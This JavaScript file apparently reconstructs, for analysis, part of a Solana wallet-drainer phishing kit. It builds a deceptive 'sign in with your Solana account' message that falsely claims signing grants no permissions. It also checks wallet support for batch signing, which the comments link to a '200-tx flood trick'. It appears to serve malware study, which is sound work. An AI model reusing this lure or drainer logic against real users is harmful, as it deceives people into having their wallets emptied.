/**
 * Sign-In With Solana (SIWS) message builder.
 *
 * The kit optionally presents a "Sign in with your Solana account"
 * message before or instead of the drain transaction, depending on
 * flow state (state.he.be). This is distinct from the main drain flow —
 * it is used as a secondary persuasion step or as a "verify wallet
 * ownership" framing when the main drain-tx framing fails.
 *
 * String-table evidence:
 *   [360] " wants you to sign in with your Solana account"
 *   [361] "\n\nWelcome to our DApp. Signing is the only way we can truly
 *           know that you are the owner of the wallet you are connecting.
 *           Signing is a safe, gas-less transaction that does not in any
 *           way give us permission to perform any transactions with your
 *           wallet.\n\nURI: https://"
 *   [362] "/login\nVersion: 1\nNonce: "
 *   [1014] "Confirm that you're the owner of this account"
 *
 * Locale string [0] (all languages): "Incoming transfer" / "Transfert entrant" /
 * "收到转账：" — this header is used for the decoy transaction preview, not
 * the SIWS flow.
 *
 * The SIWS message template (EIP-4361 / CAIP-122 on Solana):
 *
 *   <host> wants you to sign in with your Solana account
 *   <walletAddress>
 *
 *   Welcome to our DApp. Signing is the only way we can truly know that
 *   you are the owner of the wallet you are connecting. Signing is a
 *   safe, gas-less transaction that does not in any way give us
 *   permission to perform any transactions with your wallet.
 *
 *   URI: https://<host>/login
 *   Version: 1
 *   Nonce: <16-hex-random>
 *
 * The nonce is a random 8-byte hex string (16 characters).
 * The signed message is not sent to any endpoint directly; instead the
 * kit verifies the signature on the client side to confirm wallet
 * ownership, then proceeds to the drain-tx flow.
 *
 * "sol_signAllTransactions" [436] is the wallet-standard feature name
 * the kit checks for to determine whether the connected wallet supports
 * batch signing (the 200tx flood trick).
 */

function buildSiwsMessage(host, walletAddress) {
  const nonce = randomHex(16); // 8 random bytes as hex
  return (
    host + " wants you to sign in with your Solana account\n" // [360]
    + walletAddress + "\n"
    + "\n\nWelcome to our DApp. Signing is the only way we can truly know"
    + " that you are the owner of the wallet you are connecting."
    + " Signing is a safe, gas-less transaction that does not in any way"
    + " give us permission to perform any transactions with your wallet."
    + "\n\nURI: https://"  // [361] ends with "URI: https://"
    + host + "/login\n"    // [362] starts with "/login"
    + "Version: 1\n"
    + "Nonce: " + nonce    // [362] "Version: 1\nNonce: "
  );
}

function randomHex(length) {
  const bytes = crypto.getRandomValues(new Uint8Array(length / 2));
  return Array.from(bytes, b => b.toString(16).padStart(2, "0")).join("");
}

/**
 * canSignAll(wallet):
 *   Returns true if the connected wallet supports signAllTransactions
 *   (wallet-standard feature "solana:signAllTransactions" [754]).
 *   This is the check that enables the 200-tx flood trick.
 *
 *   The kit also checks for the legacy "sol_signAllTransactions" [436]
 *   property on window.solana for Phantom/Solflare legacy injection.
 */
function canSignAll(wallet) {
  // wallet-standard: check feature set
  if (wallet?.features?.["solana:signAllTransactions"]) return true;
  // legacy injection
  if (typeof window.solana?.signAllTransactions === "function") return true;
  if (typeof window.solana?.sol_signAllTransactions === "function") return true;
  return false;
}
